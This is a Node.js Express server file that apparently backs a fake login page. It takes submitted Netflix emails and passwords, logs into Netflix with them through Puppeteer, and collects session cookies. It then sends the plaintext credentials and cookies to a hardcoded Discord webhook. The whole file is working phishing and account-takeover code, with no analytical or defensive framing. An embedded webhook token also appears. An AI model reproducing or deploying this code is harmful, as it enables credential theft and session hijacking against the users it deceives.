const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const puppeteer = require('puppeteer');
const fetch = require('node-fetch');

const app = express();
const PORT = 4000;
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1326337992985415743/J0foow9K41bJWcverV7UWSEscLV1UqlHcg3rv9z0BWcFGbByfbKZbMMOBFs2kxJQdIUo';

// Middleware
app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(__dirname));

// Route for root path
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Function to login using Puppeteer and fetch cookies
async function getNetflixCookies(email, password) {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    try {
        await page.goto('https://www.netflix.com/login');
        await page.waitForSelector('input[name="userLoginId"]');

        await page.type('input[name="userLoginId"]', email);
        await page.type('input[name="password"]', password);
        await page.click('button[data-uia="login-submit"]');
        
        await page.waitForNavigation({ waitUntil: 'networkidle2' });

        const cookies = await page.cookies();
        const relevantCookies = cookies.filter(cookie => ['NetflixId', 'auth', 'Session'].includes(cookie.name));

        console.log('Cookies:', relevantCookies);

        await browser.close();
        return relevantCookies;
    } catch (error) {
        console.error('Error:', error);
        await browser.close();
        return null;
    }
}

// Endpoint to save login data and send cookies to Discord
app.post('/save-login', async (req, res) => {
    const { email, password } = req.body;

    try {
        const cookies = await getNetflixCookies(email, password);

        if (cookies && cookies.length > 0) {
            console.log('Cookies successfully retrieved:', cookies);

            const discordMessage = {
                content: `**New Login Data**\n- **Email:** ${email}\n- **Password:** ${password}\n- **Cookies:** ${JSON.stringify(cookies)}`
            };

            // Send data to Discord
            const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordMessage)
            });

            if (discordResponse.ok) {
                console.log('Message successfully sent to Discord');
                res.status(200).send({ success: true, message: 'Data successfully sent to Discord.' });
            } else {
                throw new Error('Failed to send message to Discord');
            }
        } else {
            res.status(400).send({ success: false, message: 'Cookies not found or login failed.' });
        }
    } catch (error) {
        console.error('Error during login process:', error);
        res.status(500).send({ success: false, error: 'An error occurred during login to Netflix.' });
    }
});

// Start the server
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
